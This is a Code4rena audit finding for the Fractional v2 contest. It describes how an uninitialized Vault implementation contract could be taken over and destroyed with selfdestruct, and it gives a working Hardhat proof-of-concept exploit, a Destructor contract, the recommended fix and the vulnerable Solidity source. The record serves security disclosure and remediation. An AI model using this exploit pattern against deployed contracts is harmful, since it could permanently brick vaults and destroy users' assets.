{
  "Title": "[H-01] Vault implementation can be destroyed leading to loss of all assets",
  "Content": "_Submitted by 0xA5DF, also found by 242, 0x, 0xsanson, Critical, sorrynotsorry, unforgiven, and zzzitron_\n\n<https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/VaultFactory.sol#L19-L22>\n\n<https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L11-L25>\n\n### Vulnerability Details\n\nThis is a basic uninitialized proxy bug, the `VaultFactory` creates a single implementation of `Vault` and then creates a proxy to that implementation every time a new vault needs to be deployed.\n\nThe problem is that that implementation vault is not initialized , which means that anybody can initialize the contract to become the owner, and then destroy it by doing a delegate call (via the `execute` function) to a function with the `selfdestruct` opcode.\nOnce the implementation is destroyed all of the vaults will be unusable. And since there's no logic in the proxies to update the implementation - that means this is permanent (i.e. there's no way to call any function on any vault anymore, they're simply dead).\n\n### Impact\n\nThis is a critical bug, since ALL assets held by ALL vaults will be lost. There's no way to transfer them out and there's no way to run any function on any vault.\n\nAlso, there's no way to fix the current deployed contracts (modules and registry), since they all depend on the factory vault, and there's no way to update them to a different factory. That means Fractional would have to deploy a new set of contracts after fixing the bug (this is a relatively small issue though).\n\n### Proof of Concept\n\nI created the PoC based on the `scripts/deploy.js` file, here's a stripped-down version of that:\n\n```javascript\nconst { ethers } = require(\"hardhat\");\n\nconst ZERO_ADDRESS = \"0x0000000000000000000000000000000000000000\";\n\nasync function main() {\n    const [deployer, attacker] = await ethers.getSigners();\n\n    // Get all contract factories\n    const BaseVault = await ethers.getContractFactory(\"BaseVault\");\n    const Supply = await ethers.getContractFactory(\"Supply\");\n    const VaultRegistry = await ethers.getContractFactory(\"VaultRegistry\");\n\n    // Deploy contracts\n\n    const registry = await VaultRegistry.deploy();\n    await registry.deployed();\n\n    const supply = await Supply.deploy(registry.address);\n    await supply.deployed();\n\n    // notice that the `factory` var in the original `deploy.js` file is a different factory than the registry's\n    const registryVaultFactory = await ethers.getContractAt(\"VaultFactory\", await registry.factory());\n\n    const implVaultAddress = await registryVaultFactory.implementation();\n    const vaultImpl = await ethers.getContractAt(\"Vault\", implVaultAddress);\n\n    const baseVault = await BaseVault.deploy(registry.address, supply.address);\n    await baseVault.deployed();\n    // proxy vault - the vault that's used by the user\n    let proxyVault = await deployVault(baseVault, registry, attacker);\n\n    const destructorFactory = await ethers.getContractFactory(\"Destructor\");\n    const destructor = await destructorFactory.deploy();\n\n\n    let destructData = destructor.interface.encodeFunctionData(\"destruct\", [attacker.address]);\n\n    const abi = new ethers.utils.AbiCoder();\n    const leafData = abi.encode([\"address\", \"address\", \"bytes4\"],\n        [attacker.address, destructor.address, destructor.interface.getSighash(\"destruct\")]);\n    const leafHash = ethers.utils.keccak256(leafData);\n\n    await vaultImpl.connect(attacker).init();\n\n    await vaultImpl.connect(attacker).setMerkleRoot(leafHash);\n    // we don't really need to do this ownership-transfer, because the contract is still usable till the end of the tx, but I'm doing it just in case\n    await vaultImpl.connect(attacker).transferOwnership(ZERO_ADDRESS);\n\n    // before: everything is fine\n    let implVaultCode = await ethers.provider.getCode(implVaultAddress);\n    console.log(\"Impl Vault code size before:\", implVaultCode.length - 2); // -2 for the 0x prefix\n    let owner = await proxyVault.owner();\n    console.log(\"Proxy Vault works fine, owner is: \", owner);\n\n\n    await vaultImpl.connect(attacker).execute(destructor.address, destructData, []);\n\n\n    // after: vault implementation is destructed\n    implVaultCode = await ethers.provider.getCode(implVaultAddress);\n    console.log(\"\\nVault code size after:\", implVaultCode.length - 2); // -2 for the 0x prefix\n\n    try {\n        owner = await proxyVault.owner();\n    } catch (e) {\n        console.log(\"Proxy Vault isn't working anymore.\", e.toString().substring(0, 300));\n    }\n}\n\nasync function deployVault(baseVault, registry, attacker) {\n    const nodes = await baseVault.getLeafNodes();\n\n    const tx = await registry.connect(attacker).create(nodes[0], [], []);\n    const receipt = await tx.wait();\n\n    const vaultEvent = receipt.events.find(e => e.address == registry.address);\n\n    const newVaultAddress = vaultEvent.args._vault;\n    const newVault = await ethers.getContractAt(\"Vault\", newVaultAddress);\n    return newVault;\n}\n\n\nif (require.main === module) {\n    main()\n}\n```\n\n`Destructor.sol` file:\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.13;\n\ncontract Destructor{\n    function destruct(address payable dst) public {\n        selfdestruct(dst);\n    }\n}\n```\n\nOutput:\n\n    Impl Vault code size before: 10386\n    Proxy Vault works fine, owner is:  0x5FbDB2315678afecb367f032d93F642f64180aa3\n\n    Vault code size after: 0\n    Proxy Vault isn't working anymore. Error: call revert exception [ See: https://links.ethers.org/v5-errors-CALL_EXCEPTION ] (method=\"owner()\", data=\"0x\", errorArgs=null, errorName=null, errorSignature=null, reason=null, code=CALL_EXCEPTION, version=abi/5.6.2)\n\nSidenote: as the comment in the code says, we don't really need to transfer the ownership to the zero address.\nIt's just that Foundry's `forge` did revert the destruction when I didn't do it, with the error of `OwnerChanged` (i.e. once the `selfdestruct` was called the owner became the zero address, which is different than the original owner) so I decided to add this just in case.\nThis is probably a bug in `forge`, since the contract shouldn't destruct till the end of the tx (Hardhat indeed didn't revert the destruction even when the attacker was the owner).\n\n### Tools Used\n\nHardhat\n\n### Recommended Mitigation Steps\n\nAdd init in `Vault`'s constructor (and make the `init` function `public` instead of `external`):\n\n```solidity\ncontract Vault is IVault, NFTReceiver {\n    /// @notice Address of vault owner\n    address public owner;\n    /// ...\n\n    constructor(){\n        // initialize implementation\n        init();\n    }\n\n    /// @dev Initializes nonce and proxy owner\n    function init() public {\n\n```\n\nAlternately you can add init in `VaultFactory.sol` constructor, but I think initializing in the contract itself is a better practice.\n\n```solidity\n    /// @notice Initializes implementation contract\n    constructor() {\n        implementation = address(new Vault());\n        Vault(implementation).init();\n    }\n\n```\n\nAfter mitigation the PoC will output this:\n\n    Error: VM Exception while processing transaction: reverted with custom error 'Initialized(\"0xa16E02E87b7454126E5E10d957A927A7F5B5d2be\", \"0x70997970C51812dc3A010C7d01b50e0d17dc79C8\", 1)'\n        at Vault._execute (src/Vault.sol:124)\n        at Vault.init (src/Vault.sol:24)\n        at HardhatNode._mineBlockWithPendingTxs\n        ....\n\n**[stevennevins (Fractional) confirmed and commented](https://github.com/code-423n4/2022-07-fractional-findings/issues/200#issuecomment-1189171679):**\n > Acknowledging the severity of this and will fix it. Thank you for reporting @0xA5DF.\n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-07-fractional-findings/issues/200#issuecomment-1195541158):**\n > Agree this is High risk. If this had gone unnoticed for a period of time, then later self destructing the implementation contract would brick all vaults and lose funds for potentially many users.\n\n***\n\n",
  "Impact": "HIGH",
  "Source": "https://code4rena.com/contests/2022-07-fractional-v2-contest",
  "Code": [
    {
      "filename": "src/VaultFactory.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.13;\n\nimport {Create2ClonesWithImmutableArgs} from \"clones-with-immutable-args/src/Create2ClonesWithImmutableArgs.sol\";\nimport {IVaultFactory} from \"./interfaces/IVaultFactory.sol\";\nimport {Vault} from \"./Vault.sol\";\n\n/// @title Vault Factory\n/// @author Fractional Art\n/// @notice Factory contract for deploying fractional vaults\ncontract VaultFactory is IVaultFactory {\n    /// @dev Use clones library for address types\n    using Create2ClonesWithImmutableArgs for address;\n    /// @notice Address of Vault proxy contract\n    address public implementation;\n    /// @dev Internal mapping to track the next seed to be used by an EOA\n    mapping(address => bytes32) internal nextSeeds;\n\n    /// @notice Initializes implementation contract\n    constructor() {\n        implementation = address(new Vault());\n    }\n\n    /// @notice Deploys new vault for sender\n    /// @return vault Address of deployed vault\n    function deploy() external returns (address payable vault) {\n        vault = deployFor(msg.sender);\n    }\n\n    /// @notice Gets pre-computed address of vault deployed by given account\n    /// @param _deployer Address of vault deployer\n    /// @return vault Address of next vault\n    function getNextAddress(address _deployer)\n        external\n        view\n        returns (address vault)\n    {\n        bytes32 salt = keccak256(abi.encode(_deployer, nextSeeds[_deployer]));\n        (uint256 creationPtr, uint256 creationSize) = implementation\n            .cloneCreationCode(abi.encodePacked());\n\n        bytes32 creationHash;\n        assembly {\n            creationHash := keccak256(creationPtr, creationSize)\n        }\n        bytes32 data = keccak256(\n            abi.encodePacked(bytes1(0xff), address(this), salt, creationHash)\n        );\n        vault = address(uint160(uint256(data)));\n    }\n\n    /// @notice Gets next seed value of given account\n    /// @param _deployer Address of vault deployer\n    /// @return Value of next seed\n    function getNextSeed(address _deployer) external view returns (bytes32) {\n        return nextSeeds[_deployer];\n    }\n\n    /// @notice Deploys new vault for given address\n    /// @param _owner Address of vault owner\n    /// @return vault Address of deployed vault\n    function deployFor(address _owner) public returns (address payable vault) {\n        bytes32 seed = nextSeeds[tx.origin];\n\n        // Prevent front-running the salt by hashing the concatenation of tx.origin and the user-provided seed.\n        bytes32 salt = keccak256(abi.encode(tx.origin, seed));\n\n        bytes memory data = abi.encodePacked();\n        vault = implementation.clone(salt, data);\n        Vault(vault).init();\n\n        // Transfer the ownership from this factory contract to the specified owner.\n        Vault(vault).transferOwnership(_owner);\n\n        // Increment the seed.\n        unchecked {\n            nextSeeds[tx.origin] = bytes32(uint256(seed) + 1);\n        }\n\n        // Log the vault via en event.\n        emit DeployVault(\n            tx.origin,\n            msg.sender,\n            _owner,\n            seed,\n            salt,\n            address(vault)\n        );\n    }\n}"
    },
    {
      "filename": "src/Vault.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.13;\n\nimport {IVault} from \"./interfaces/IVault.sol\";\nimport {MerkleProof} from \"@openzeppelin/contracts/utils/cryptography/MerkleProof.sol\";\nimport {NFTReceiver} from \"./utils/NFTReceiver.sol\";\n\n/// @title Vault\n/// @author Fractional Art\n/// @notice Proxy contract for storing fractionalized assets\ncontract Vault is IVault, NFTReceiver {\n    /// @notice Address of vault owner\n    address public owner;\n    /// @notice Merkle root hash of vault permissions\n    bytes32 public merkleRoot;\n    /// @notice Initializer value\n    uint256 public nonce;\n    /// @dev Minimum reserve of gas units\n    uint256 private constant MIN_GAS_RESERVE = 5_000;\n    /// @notice Mapping of function selector to plugin address\n    mapping(bytes4 => address) public methods;\n\n    /// @dev Initializes nonce and proxy owner\n    function init() external {\n        if (nonce != 0) revert Initialized(owner, msg.sender, nonce);\n        nonce = 1;\n        owner = msg.sender;\n        emit TransferOwnership(address(0), msg.sender);\n    }\n\n    /// @dev Callback for receiving Ether when the calldata is empty\n    receive() external payable {}\n\n    /// @dev Callback for handling plugin transactions\n    /// @param _data Transaction data\n    /// @return response Return data from executing plugin\n    // prettier-ignore\n    fallback(bytes calldata _data) external payable returns (bytes memory response) {\n        address plugin = methods[msg.sig];\n        (,response) = _execute(plugin, _data);\n    }\n\n    /// @notice Executes vault transactions through delegatecall\n    /// @param _target Target address\n    /// @param _data Transaction data\n    /// @param _proof Merkle proof of permission hash\n    /// @return success Result status of delegatecall\n    /// @return response Return data of delegatecall\n    function execute(\n        address _target,\n        bytes calldata _data,\n        bytes32[] calldata _proof\n    ) external payable returns (bool success, bytes memory response) {\n        bytes4 selector;\n        assembly {\n            selector := calldataload(_data.offset)\n        }\n\n        // Generate leaf node by hashing module, target and function selector.\n        bytes32 leaf = keccak256(abi.encode(msg.sender, _target, selector));\n        // Check that the caller is either a module with permission to call or the owner.\n        if (!MerkleProof.verify(_proof, merkleRoot, leaf)) {\n            if (msg.sender != owner)\n                revert NotAuthorized(msg.sender, _target, selector);\n        }\n\n        (success, response) = _execute(_target, _data);\n    }\n\n    /// @notice Installs plugin by setting function selector to contract address\n    /// @param _selectors List of function selectors\n    /// @param _plugins Addresses of plugin contracts\n    function install(bytes4[] memory _selectors, address[] memory _plugins)\n        external\n    {\n        if (owner != msg.sender) revert NotOwner(owner, msg.sender);\n        uint256 length = _selectors.length;\n        for (uint256 i = 0; i < length; i++) {\n            methods[_selectors[i]] = _plugins[i];\n        }\n        emit InstallPlugin(_selectors, _plugins);\n    }\n\n    /// @notice Sets merkle root of vault permissions\n    /// @param _rootHash Hash of merkle root\n    function setMerkleRoot(bytes32 _rootHash) external {\n        if (owner != msg.sender) revert NotOwner(owner, msg.sender);\n        merkleRoot = _rootHash;\n    }\n\n    /// @notice Transfers ownership to given account\n    /// @param _newOwner Address of new owner\n    function transferOwnership(address _newOwner) external {\n        if (owner != msg.sender) revert NotOwner(owner, msg.sender);\n        owner = _newOwner;\n        emit TransferOwnership(msg.sender, _newOwner);\n    }\n\n    /// @notice Uninstalls plugin by setting function selector to zero address\n    /// @param _selectors List of function selectors\n    function uninstall(bytes4[] memory _selectors) external {\n        if (owner != msg.sender) revert NotOwner(owner, msg.sender);\n        uint256 length = _selectors.length;\n        for (uint256 i = 0; i < length; i++) {\n            methods[_selectors[i]] = address(0);\n        }\n        emit UninstallPlugin(_selectors);\n    }\n\n    /// @notice Executes plugin transactions through delegatecall\n    /// @param _target Target address\n    /// @param _data Transaction data\n    /// @return success Result status of delegatecall\n    /// @return response Return data of delegatecall\n    function _execute(address _target, bytes calldata _data)\n        internal\n        returns (bool success, bytes memory response)\n    {\n        // Check that the target is a valid contract\n        uint256 codeSize;\n        assembly {\n            codeSize := extcodesize(_target)\n        }\n        if (codeSize == 0) revert TargetInvalid(_target);\n        // Save the owner address in memory to ensure that it cannot be modified during the DELEGATECALL\n        address owner_ = owner;\n        // Reserve some gas to ensure that the function has enough to finish the execution\n        uint256 stipend = gasleft() - MIN_GAS_RESERVE;\n\n        // Delegate call to the target contract\n        (success, response) = _target.delegatecall{gas: stipend}(_data);\n        if (owner_ != owner) revert OwnerChanged(owner_, owner);\n\n        // Revert if execution was unsuccessful\n        if (!success) {\n            if (response.length == 0) revert ExecutionReverted();\n            _revertedWithReason(response);\n        }\n    }\n\n    /// @notice Reverts transaction with reason\n    function _revertedWithReason(bytes memory _response) internal pure {\n        assembly {\n            let returndata_size := mload(_response)\n            revert(add(32, _response), returndata_size)\n        }\n    }\n}"
    }
  ]
}